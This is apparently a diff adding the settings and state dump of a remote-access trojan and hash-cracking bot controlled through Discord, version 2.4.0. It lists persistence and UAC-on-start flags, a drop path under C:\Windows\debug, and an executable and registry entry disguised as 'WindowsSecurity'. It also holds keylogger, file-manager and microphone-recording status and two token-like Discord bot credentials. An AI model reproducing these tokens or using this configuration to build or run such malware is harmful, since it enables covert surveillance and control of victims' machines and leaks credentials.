@@ -1,0 +1,60 @@
+**All Variables:****SETTINGS YOU SET:**
+bool **SpecialPersistent = False**
+bool **NormalPersistent = True**
+bool **UAConStart = True**
+bool **AutoCrack = True**
+bool **AutoRAT = True**
+bool **DebugMode = False**
+string **BOT_CATEGORY = CLIENTS**
+string **RAT_CATEGORY = RAT**
+string **BOT_TOKEN = MTE4NDUwMDgwMzE2ODM3ODkwMA.G5OUXt.zGqLK-1Sm_fDJUyQhhxLK6HEYFr3u4kUecOMCQ**
+string **ratPrimaryToken = MTE5Njg3NjIzMjk4NjQ2ODQ5Mw.GMcowN.BKhzAJuo4TYQUkPwRmHXCxHi33_W3ag63DeI4Y**
+string **ratAlternativeToken = <BOT TOKEN (IS NOT USED IN BELOW 2.2.0)>**
+string **registryName = WindowsSecurity**
+string **dropPath = C:\Windows\debug\multi**
+string **fileName = multiCracker.exe**
+string **fileNameSpecial = WindowsSecurity.exe**
+
+**OTHER**
+bool **FoundCorrectPass = True**
+string **elsesPassword = N/A**
+string **elsesHash = N/A**
+bool EmergencySTOP = False
+string **hash = e305d9079d89db6dbfe22487eb7448f43f0f4ab3255bdae27b1d67c0308a193a**
+int currentWarningLevel = 0
+int currentWarningLevelRAT = 0
+string **currentVersion = 2.4.0**
+int **forceEnd = 2147483647**
+int **forceStart = 0**
+string forcesSS = 6444438,6666660
+
+**HASH SETTINGS**
+string **Algorithm = SHA256**
+bool **UseNumbers = True**
+bool **UseLetters = False**
+bool **UseSymbols = False**
+bool **UseCapitals = False**
+int **MaxLength = 7**
+int **MinLength = 1**
+
+**AUTO SETTINGS**
+bool **AutoHash = e305d9079d89db6dbfe22487eb7448f43f0f4ab3255bdae27b1d67c0308a193a**
+string **AutoAlgorithm = SHA256**
+bool **AutoUseNumbers = True**
+bool **AutoUseLetters = False**
+bool **AutoUseSymbols = False**
+bool **AutoUseCapitals = False**
+int **AutoMaxLength = 7**
+int **AutoMinLength = 1**
+string **AutoForcesSS = 6444438,6666660**
+
+**OTHER SETTINGS**
+bool **RATRunning = True**
+bool **manuallyKilled = False**
+bool **fileManagerActive = False**
+string **currentPath = C:\**
+bool **KeyloggerRunning = False**
+string **KeyloggerLog = **
+bool **isMicrophoneRecording = False**
+int **counter = 0**
+BigInteger **AccualCount = 0**
